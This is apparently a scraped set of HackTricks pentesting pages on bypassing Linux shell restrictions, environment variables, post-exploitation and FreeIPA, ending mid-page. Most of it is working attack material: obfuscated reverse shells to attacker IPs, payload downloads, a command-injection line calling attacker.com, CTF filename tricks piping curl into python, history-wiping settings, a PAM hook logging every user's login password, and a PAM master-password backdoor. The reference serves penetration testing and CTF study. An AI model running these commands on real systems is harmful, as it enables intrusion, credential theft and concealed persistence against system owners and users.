0x00)\nfor\nj\nin\n$(\n(\nfor\ni\nin\n{\n0\n..\n9\n}{\n0\n..\n9\n}\n{\n0\n..\n9\n}{\na\n..\nf\n}\n{\na\n..\nf\n}{\n0\n..\n9\n}\n{\na\n..\nf\n}{\na\n..\nf\n};\ndo\necho\n$i\n;\ndone\n)\n|\nsort\n|\ngrep\n-v\n\"20\\|00\"\n)\n;\ndo\necho\n-n\n-e\n\"\\x\n$j\n\"\n>>\nbytes\n;\ndone\nIptables\n#Delete curent rules and chains\niptables\n--flush\niptables --delete-chain\n‚Äã\n#allow loopback\niptables\n-A\nINPUT\n-i\nlo\n-j\nACCEPT\niptables\n-A\nOUTPUT\n-o\nlo\n-j\nACCEPT\n‚Äã\n#drop ICMP\niptables\n-A\nINPUT\n-p\nicmp\n-m\nicmp --icmp-type any\n-j\nDROP\niptables\n-A\nOUTPUT\n-p\nicmp\n-j\nDROP\n‚Äã\n#allow established connections\niptables\n-A\nINPUT\n-m\nstate\n--state\nRELATED,ESTABLISHED\n-j\nACCEPT\n‚Äã\n#allow ssh, http, https, dns\niptables\n-A\nINPUT\n-s\n10.10\n.10.10/24\n-p\ntcp\n-m\ntcp\n--dport\n22\n-j\nACCEPT\niptables\n-A\nINPUT\n-p\ntcp\n-m\nstate\n--state\nNEW\n-m\ntcp\n--dport\n80\n-j\nACCEPT\niptables\n-A\nINPUT\n-p\ntcp\n-m\nstate\n--state\nNEW\n-m\ntcp\n--dport\n443\n-j\nACCEPT\niptables\n-A\nINPUT\n-p\nudp\n-m\nudp\n--sport\n53\n-j\nACCEPT\niptables\n-A\nINPUT\n-p\ntcp\n-m\ntcp\n--sport\n53\n-j\nACCEPT\niptables\n-A\nOUTPUT\n-p\nudp\n-m\nudp\n--dport\n53\n-j\nACCEPT\niptables\n-A\nOUTPUT\n-p\ntcp\n-m\ntcp\n--dport\n53\n-j\nACCEPT\n‚Äã\n#default policies\niptables\n-P\nINPUT DROP\niptables\n-P\nFORWARD ACCEPT\niptables\n-P\nOUTPUT ACCEPT\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nPrevious\nArbitrary File Write to Root\nNext\n- Linux Hardening\nBypass Linux Restrictions\nLast modified\n2mo ago"
    },
    {
        "title": "Bypass Linux Restrictions",
        "url": "https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions",
        "text": "Bypass Linux Restrictions\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nCommon Limitations Bypasses\nReverse Shell\n# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time\necho\n\"echo\n$(\necho\n'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1'\n|\nbase64\n|\nbase64\n)\n|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h\"\n|\nsed\n's/ /${IFS}/g'\n# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h\nShort Rev shell\n#Trick from Dikline\n#Get a rev shell with\n(\nsh\n)\n0\n>\n/dev/tcp/10.10.10.10/443\n#Then get the out of the rev shell executing inside of it:\nexec\n>\n&0\nBypass Paths and forbidden words\n# Question mark binary substitution\n/usr/bin/p?ng\n# /usr/bin/ping\nnma?\n-p\n80\nlocalhost\n# /usr/bin/nmap -p 80 localhost\n‚Äã\n# Wildcard(*) binary substitution\n/usr/bin/who*mi\n# /usr/bin/whoami\n‚Äã\n# Wildcard + local directory arguments\ntouch\n--\n-la\n# -- stops processing options after the --\nls\n*\necho\n*\n#List current files and folders with echo and wildcard\n‚Äã\n# [chars]\n/usr/bin/n\n[\nc\n]\n# /usr/bin/nc\n‚Äã\n# Quotes\n'p'\ni\n'n'\ng\n# ping\n\"w\"\nh\n\"o\"\na\n\"m\"\ni\n# whoami\nech\n''\no\ntest\n# echo test\nech\n\"\"\no\ntest\n# echo test\nbas\n''\ne64\n# base64\n‚Äã\n#Backslashes\n\\\nu\n\\\nn\n\\\na\n\\\nm\n\\\ne\n\\\n-\n\\\na\n# uname -a\n/\n\\\nb\n\\\ni\n\\\nn/////s\n\\\nh\n‚Äã\n# $@\nwho\n$@\nami\n#whoami\n‚Äã\n# Transformations (case, reverse, base64)\n$(\ntr\n\"[A-Z]\"\n\"[a-z]\"\n<<<\n\"WhOaMi\"\n)\n#whoami -> Upper case to lower case\n$(\na\n=\n\"WhOaMi\"\n;\nprintf\n%s\n\"\n${a\n,,\n}\n\"\n)\n#whoami -> transformation (only bash)\n$(\nrev\n<<<\n'imaohw'\n)\n#whoami\nbash\n<<<\n$(\nbase64 -d\n<<<\nY2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw\n==\n)\n#base64\n‚Äã\n‚Äã\n# Execution through $0\necho\nwhoami\n|\n$0\n‚Äã\n# Uninitialized variables: A uninitialized variable equals to null (nothing)\ncat\n$u\n/etc\n$u\n/passwd\n$u\n# Use the uninitialized variable without {} before any symbol\np\n${u}\ni\n${u}\nn\n${u}\ng\n# Equals to ping, use {} to put the uninitialized variables between valid characters\n‚Äã\n# Fake commands\np\n$(\nu\n)\ni\n$(\nu\n)\nn\n$(\nu\n)\ng\n# Equals to ping but 3 errors trying to execute \"u\" are shown\nw\n`\nu\n`\nh\n`\nu\n`\no\n`\nu\n`\na\n`\nu\n`\nm\n`\nu\n`\ni\n# Equals to whoami but 5 errors trying to execute \"u\" are shown\n‚Äã\n# Concatenation of strings using history\n!\n-1\n# This will be substitute by the last command executed, and !-2 by the penultimate command\nmi\n# This will throw an error\nwhoa\n# This will throw an error\n!\n-1\n!\n-2\n# This will execute whoami\nBypass forbidden spaces\n# {form}\n{\ncat,lol.txt\n}\n# cat lol.txt\n{\necho,test\n}\n# echo test\n‚Äã\n# IFS - Internal field separator, change \" \" for any other character (\"]\" in this case)\ncat\n${\nIFS\n}\n/etc/passwd\n# cat /etc/passwd\ncat\n$IFS\n/etc/passwd\n# cat /etc/passwd\n‚Äã\n# Put the command line in a variable and then execute it\nIFS\n=\n];\nb\n=\nwget\n]\n10.10\n.14.21:53/lol\n]\n-P\n]\n/tmp\n;\n$b\nIFS\n=\n];\nb\n=\ncat\n]\n/etc/passwd\n;\n$b\n# Using 2 \";\"\nIFS\n=\n,\n;\n`\ncat\n<<<\ncat,/etc/passwd\n`\n# Using cat twice\n#  Other way, just change each space for ${IFS}\necho\n${\nIFS\n}\ntest\n‚Äã\n# Using hex format\nX\n=\n$'cat\n\\x20\n/etc/passwd'\n&&\n$X\n‚Äã\n# Using tabs\necho\n\"ls\n\\x09\n-l\"\n|\nbash\n‚Äã\n# New lines\np\n\\\ni\n\\\nn\n\\\ng\n# These 4 lines will equal to ping\n‚Äã\n# Undefined variables and !\n$u\n$u\n# This will be saved in the history and can be used as a space, please notice that the $u variable is undefined\nuname\n!\n-1\n\\\n-a\n# This equals to uname -a\nBypass backslash and slash\ncat\n${\nHOME\n:\n0\n:\n1}\netc\n${\nHOME\n:\n0\n:\n1}\npasswd\ncat\n$(\necho\n.\n|\ntr\n'!-0'\n'\"-1'\n)\netc\n$(\necho\n.\n|\ntr\n'!-0'\n'\"-1'\n)\npasswd\nBypass pipes\nbash\n<<<\n$(\nbase64 -d\n<<<\nY2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw\n==\n)\nBypass with hex encoding\necho\n-e\n\"\n\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\n\"\ncat\n`\necho\n-e\n\"\n\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\n\"\n`\nabc\n=\n$'\n\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\n'\n;\ncat\nabc\n`\necho\n$'cat\n\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\n'\n`\ncat\n`\nxxd\n-r\n-p\n<<<\n2f6574632f706173737764\n`\nxxd\n-r\n-ps\n<\n(\necho\n2f6574632f706173737764\n)\ncat\n`\nxxd\n-r\n-ps\n<\n(\necho\n2f6574632f706173737764\n)\n`\nBypass IPs\n# Decimal IPs\n127.0\n.0.1\n==\n2130706433\nTime based data exfiltration\ntime\nif\n[\n$(\nwhoami\n|\ncut\n-c\n1\n)\n==\ns\n];\nthen\nsleep\n5\n;\nfi\nGetting chars from Env Variables\necho\n${\nLS_COLORS\n:\n10\n:\n1}\n#;\necho\n${\nPATH\n:\n0\n:\n1}\n#/\nDNS data exfiltration\nYou could use\nburpcollab\nor\npingb\nfor example.\nBuiltins\nIn case you cannot execute external functions and only have access to a\nlimited set of builtins to obtain RCE\n, there are some handy tricks to do it. Usually you\nwon't be able to use all\nof the\nbuiltins\n, so you should\nknow all your options\nto try to bypass the jail. Idea from\ndevploit\n.\nFirst of all check all the\nshell builtins\n.\nThen here you have some\nrecommendations\n:\n# Get list of builtins\ndeclare\nbuiltins\n‚Äã\n# In these cases PATH won't be set, so you can try to set it\nPATH\n=\n\"/bin\"\n/bin/ls\nexport\nPATH\n=\n\"/bin\"\ndeclare\nPATH\n=\n\"/bin\"\nSHELL\n=\n/bin/bash\n‚Äã\n# Hex\n$(\necho\n-e\n\"\n\\x2f\\x62\\x69\\x6e\\x2f\\x6c\\x73\n\"\n)\n$(\necho\n-e\n\"\n\\x2f\\x62\\x69\\x6e\\x2f\\x6c\\x73\n\"\n)\n‚Äã\n# Input\nread\naaa\n;\nexec\n$aaa\n#Read more commands to execute and execute them\nread\naaa\n;\neval\n$aaa\n‚Äã\n# Get \"/\" char using printf and env vars\nprintf\n%.1s\n\"\n$PWD\n\"\n## Execute /bin/ls\n$(\nprintf\n%.1s\n\"\n$PWD\n\"\n)\nbin\n$(\nprintf\n%.1s\n\"\n$PWD\n\"\n)\nls\n## To get several letters you can use a combination of printf and\ndeclare\ndeclare\nfunctions\ndeclare\nhistorywords\n‚Äã\n# Read flag in current dir\nsource\nf*\nflag.txt:1:\ncommand\nnot found: CTF\n{\nasdasdasd\n}\n‚Äã\n# Read file with read\nwhile\nread\n-r\nline\n;\ndo\necho\n$line\n;\ndone\n<\n/etc/passwd\n‚Äã\n# Get env variables\ndeclare\n‚Äã\n# Get history\nhistory\ndeclare\nhistory\ndeclare\nhistorywords\n‚Äã\n# Disable special builtins chars so you can abuse them as scripts\n[\n#[: ']' expected\n## Disable \"[\" as builtin and enable it as script\nenable\n-n\n[\necho\n-e\n'#!/bin/bash\\necho \"hello!\"'\n>\n/tmp/\n[\nchmod\n+x\n[\nexport\nPATH\n=\n/tmp:\n$PATH\nif\n[\n\"a\"\n];\nthen\necho\n1\n;\nfi\n# Will print hello!\nPolyglot command injection\n1\n;\nsleep\n${\nIFS\n}\n9\n;\n#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\n/*\n$(\nsleep\n5\n)`\nsleep\n5\n``\n*/-sleep\n(\n5\n)\n-'/*\n$(\nsleep\n5\n)\n`\nsleep\n5\n`\n#*/-sleep(5)||'\"||sleep(5)||\"/*\n`\n*/\nBypass potential regexes\n# A regex that only allow letters and numbers might be vulnerable to new line characters\n1\n%0a\n`\ncurl\nhttp://attacker.com\n`\nBashfuscator\n# From https://github.com/Bashfuscator/Bashfuscator\n./bashfuscator\n-c\n'cat /etc/passwd'\nRCE with 5 chars\n# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge\n#Oragnge Tsai solution\n## Step 1: generate `ls -t>g` to file \"_\" to be able to execute ls ordening names by cration date\nhttp://host/?cmd\n=>\nls\n\\\nhttp://host/?cmd\n=\nls\n>\n_\nhttp://host/?cmd\n=>\n\\\n\\\nhttp://host/?cmd\n=>\n-t\n\\\nhttp://host/?cmd\n=>\n\\\n>\ng\nhttp://host/?cmd\n=\nls\n>>\n_\n‚Äã\n## Step2: generate `curl orange.tw|python` to file \"g\"\n## by creating the necesary filenames and writting that content to file \"g\" executing the previous generated file\nhttp://host/?cmd\n=>\non\nhttp://host/?cmd\n=>\nth\n\\\nhttp://host/?cmd\n=>\npy\n\\\nhttp://host/?cmd\n=>\n\\\n|\n\\\nhttp://host/?cmd\n=>\ntw\n\\\nhttp://host/?cmd\n=>\ne.\n\\\nhttp://host/?cmd\n=>\nng\n\\\nhttp://host/?cmd\n=>\nra\n\\\nhttp://host/?cmd\n=>\no\n\\\nhttp://host/?cmd\n=>\n\\\n\\\nhttp://host/?cmd\n=>\nrl\n\\\nhttp://host/?cmd\n=>\ncu\n\\\nhttp://host/?cmd\n=\nsh _\n# Note that a \"\\\" char is added at the end of each filename because \"ls\" will add a new line between filenames whenwritting to the file\n‚Äã\n## Finally execute the file \"g\"\nhttp://host/?cmd\n=\nsh g\n‚Äã\n‚Äã\n# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/\n# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with \"*\"\nhttps://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/\n## Execute tar command over a folder\nhttp://52.199.204.34/?cmd\n=>\ntar\nhttp://52.199.204.34/?cmd\n=>\nzcf\nhttp://52.199.204.34/?cmd\n=>\nzzz\nhttp://52.199.204.34/?cmd\n=\n*%20/h*\n‚Äã\n# Another curiosity if you can read files of the current folder\nln\n/f*\n## If there is a file /flag.txt that will create a hard link\n## to it in the current folder\nRCE with 4 chars\n# In a similar fashion to the previous bypass this one just need 4 chars to execute commands\n# it will follow the same principle of creating the command `ls -t>g` in a file\n# and then generate the full command in filenames\n# generate \"g> ht- sl\" to file \"v\"\n'>dir'\n'>sl'\n'>g\\>'\n'>ht-'\n'*>v'\n‚Äã\n# reverse file \"v\" to file \"x\", content \"ls -th >g\"\n'>rev'\n'*v>x'\n‚Äã\n# generate \"curl orange.tw|python;\"\n'>\\;\\\\'\n'>on\\\\'\n'>th\\\\'\n'>py\\\\'\n'>\\|\\\\'\n'>tw\\\\'\n'>e.\\\\'\n'>ng\\\\'\n'>ra\\\\'\n'>o\\\\'\n'>\\ \\\\'\n'>rl\\\\'\n'>cu\\\\'\n‚Äã\n# got shell\n'sh x'\n'sh g'\nRead-Only/Noexec/Distroless Bypass\nIf you are inside a filesystem with the\nread-only and noexec protections\nor even in a distroless container, there are still ways to\nexecute arbitrary binaries, even a shell!:\nBypass FS protections: read-only / no-exec / Distroless\nChroot & other Jails Bypass\nEscaping from Jails\nReferences & More\n‚Äã\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits\n‚Äã\n‚Äã\nhttps://github.com/Bo0oM/WAF-bypass-Cheat-Sheet\n‚Äã\n‚Äã\nhttps://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0\n‚Äã\n‚Äã\nhttps://www.secjuice.com/web-application-firewall-waf-evasion/\n‚Äã\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nLinux Hardening -\nPrevious\nUseful Linux Commands\nNext\nBypass FS protections: read-only / no-exec / Distroless\nLast modified\n2mo ago"
    },
    {
        "title": "Linux Environment Variables",
        "url": "https://book.hacktricks.xyz/linux-hardening/linux-environment-variables",
        "text": "Linux Environment Variables\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nGlobal variables\nThe global variables\nwill be\ninherited by\nchild processes\n.\nYou can create a global variable for your current session doing:\nexport\nMYGLOBAL\n=\n\"hello world\"\necho\n$MYGLOBAL\n#Prints: hello world\nThis variable will be accessible by your current sessions and its child processes.\nYou can\nremove\na variable doing:\nunset\nMYGLOBAL\nLocal variables\nThe\nlocal variables\ncan only be\naccessed\nby the\ncurrent shell/script\n.\nLOCAL\n=\n\"my local\"\necho\n$LOCAL\nunset\nLOCAL\nList current variables\nset\nenv\nprintenv\ncat\n/proc/\n$$\n/environ\ncat\n/proc/\n`\npython\n-c\n\"import os; print(os.getppid())\"\n`\n/environ\nPersistent Environment variables\nFiles that affect behavior of every user:\n/etc/bash.bashrc\n: This file is read whenever an interactive shell is started (normal terminal) and all the commands specified in here are executed.\n/etc/profile and /etc/profile.d/*\n:\nThis file is read every time a user logs in. Thus all the commands executed in here will execute only once at the time of user logging in.\n**Example: **\n/etc/profile.d/somescript.sh\n#!/bin/bash\nTEST\n=\n$(\ncat\n/var/somefile\n)\nexport\n$TEST\nFiles that affect behavior for only a specific user:\n~/.bashrc\n: This file behaves the same way\n/etc/bash.bashrc\nfile works but it is executed only for a specific user. If you want to create an environment for yourself go ahead and modify or create this file in your home directory.\n~/.profile, ~/.bash_profile, ~/.bash_login\n: These files are same as\n/etc/profile\n. The difference comes in the way it is executed. This file is executed only when a user in whose home directory this file exists, logs in.\nExtracted from:\nhere\nand\nhere\n‚Äã\nCommon variables\nFrom:\nhttps://geek-university.com/linux/common-environment-variables/\n‚Äã\nDISPLAY\n‚Äì the display used by\nX\n. This variable is usually set to\n:0.0\n, which means the first display on the current computer.\nEDITOR\n‚Äì the user‚Äôs preferred text editor.\nHISTFILESIZE\n‚Äì the maximum number of lines contained in the history file.\nHISTSIZE\n‚Äì Number of lines added to the history file when the user finish his session\nHOME\n‚Äì your home directory.\nHOSTNAME\n‚Äì the hostname of the computer.\nLANG\n‚Äì your current language.\nMAIL\n‚Äì the location of the user‚Äôs mail spool. Usually\n/var/spool/mail/USER\n.\nMANPATH\n‚Äì the list of directories to search for manual pages.\nOSTYPE\n‚Äì the type of operating system.\nPS1\n‚Äì the default prompt in bash.\nPATH\n‚Äì stores the path of all the directories which holds binary files you want to execute just by specifying the name of the file and not by relative or absolute path.\nPWD\n‚Äì the current working directory.\nSHELL\n‚Äì the path to the current command shell (for example,\n/bin/bash\n).\nTERM\n‚Äì the current terminal type (for example,\nxterm\n).\nTZ\n‚Äì your time zone.\nUSER\n‚Äì your current username.\nInteresting variables for hacking\nHISTFILESIZE\nChange the\nvalue of this variable to 0\n, so when you\nend your session\nthe\nhistory file\n(~/.bash_history)\nwill be deleted\n.\nexport\nHISTFILESIZE\n=\n0\nHISTSIZE\nChange the\nvalue of this variable to 0\n, so when you\nend your session\nany command will be added to the\nhistory file\n(~/.bash_history).\nexport\nHISTSIZE\n=\n0\nhttp_proxy & https_proxy\nThe processes will use the\nproxy\ndeclared here to connect to internet through\nhttp or https\n.\nexport\nhttp_proxy\n=\n\"http://10.10.10.10:8080\"\nexport\nhttps_proxy\n=\n\"http://10.10.10.10:8080\"\nSSL_CERT_FILE & SSL_CERT_DIR\nThe processes will trust the certificates indicated in\nthese env variables\n.\nexport\nSSL_CERT_FILE\n=\n/path/to/ca-bundle.pem\nexport\nSSL_CERT_DIR\n=\n/path/to/ca-certificates\nPS1\nChange how your prompt looks.\nI have created\nthis one\n(based on another, read the code).\nRoot:\nRegular user:\nOne, two and three backgrounded jobs:\nOne background job, one stopped and last command didn't finish correctly:\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nDDexec / EverythingExec\nNext\n- Linux Hardening\nLinux Post-Exploitation\nLast modified\n1mo ago"
    },
    {
        "title": "Linux Post-Exploitation",
        "url": "https://book.hacktricks.xyz/linux-hardening/linux-post-exploitation",
        "text": "Linux Post-Exploitation\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nSniffing Logon Passwords with PAM\nLet's configure a PAM module to log each password each user uses to login. If you don't know what is PAM check:\nPAM - Pluggable Authentication Modules\nFirst, we create a bash script that will be invoked whenever a new authentication occurs.\n#!/bin/sh\necho\n\"\n$(\ndate\n)\n$PAM_USER\n,\n$(\ncat\n-\n)\n, From:\n$PAM_RHOST\n\"\n>>\n/var/log/toomanysecrets.log\nThe variables are PAM specific and will become available via the\npam_exec.so\nmodule.\nHere is the meaning of the variables:\n$PAM_USER:\nThe username that was entered.\n$PAM_RHOST:\nThe remote host (typically the IP Address)\n$(cat -):\nThis reads\nstdin\n, and will contain the password that the script grabs\nThe results are piped into a log file at\n/var/log/toomanysecrets.log\nTo\nprevent all users from reading\nthe file consider pre-creating it and running\nchmod\n, e.g.:\nsudo\ntouch\n/var/log/toomanysecrets.sh\nsudo\nchmod\n770\n/var/log/toomanysecrets.sh\nNext, the PAM configuration file needs to be updated the\npam_exec\nmodule will be used to invoke the script.\nThere are various config files located in\n/etc/pam.d/\n, and we pick\ncommon-auth\n.\nsudo nano /etc/pam.d/common-auth\nOn the very bottom of the file, add the following authentication module:\nauth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh\nThe options have the following meaning:\noptional:\nAuthenticaiton shouldn‚Äôt fail if there is an error (it‚Äôs not a required step)\npam_exec.so:\nThis is the living off the land PAM module that can invoke arbitrary scripts\nexpose_authtok:\nThis is the trick that allows to read the password via\nstdin\nquiet:\nDon‚Äôt show any errors to the user (if something doesn‚Äôt work)\nThe last argument is the shell script that was created previously\nFinally, make the file executable:\nsudo chmod 700 /usr/local/bin/toomanysecrets.sh\nNow, let‚Äôs try this out and ssh from another machine, or login locally.\nAnd then look at the log file:\n$ sudo cat /var/log/toomanysecrets.log\nSun Jun 26 23:36:37 PDT 2022 tom, Trustno1!, From: 192.168.1.149\nSun Jun 26 23:37:53 PDT 2022 tom, Trustno1!, From:\nSun Jun 26 23:39:12 PDT 2022 tom, Trustno1!, From: 192.168.1.149\nBackdooring PAM\nLet go to the sources of PAM (depends on your distro, take the same version number as yours..) and look around line numbers 170/180 in the pam_unix_auth.c file:\nvi modules/pam_unix/pam_unix_auth.c\nLet‚Äôs change this by:\nThis will allow any user using the\npassword \"0xMitsurugi\"\nto log in.\nRecompile the\npam_unix_auth.c\n, and replace the pam_unix.so file:\nmake\nsudo\ncp\n\\\n/home/mitsurugi/PAM/pam_deb/pam-1.1.8/modules/pam_unix/.libs/pam_unix.so\n\\\n/lib/x86_64-linux-gnu/security/\nYou can automate this process with\nhttps://github.com/zephrax/linux-pam-backdoor\n‚Äã\nReferences\n‚Äã\nhttps://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/\n‚Äã\n‚Äã\nhttps://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nLinux Hardening -\nPrevious\nLinux Environment Variables\nNext\nPAM - Pluggable Authentication Modules\nLast modified\n6mo ago"
    },
    {
        "title": "FreeIPA Pentesting",
        "url": "https://book.hacktricks.xyz/linux-hardening/freeipa-pentesting",
        "text": "FreeIPA Pentesting\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nThis info was taken from the posts:\n‚Äã\nhttps://posts.specterops.io/attacking-freeipa-part-i-authentication-77e73d837d6a\n‚Äã\n‚Äã\nhttps://posts.specterops.io/attacking-freeipa-part-ii-enumeration-ad27224371e1\n‚Äã\n‚Äã\nhttps://www.youtube.com/watch?v=9dOu-7BTwPQ&feature=youtu.be\n‚Äã\nBasic Information\nIt is an open source\nalternative\nto Microsoft Windows\nActive\nDirectory\n, primarily used as an integrated management solution for\nUnix\nenvironments. Similar to Active Directory, FreeIPA implements a full\nLDAP directory\ninfrastructure backed by an MIT\nKerberos\nKey Distribution Center. It uses the Dogtag\nCertificate System\nfor CA & RA certificate management, giving it the ability to 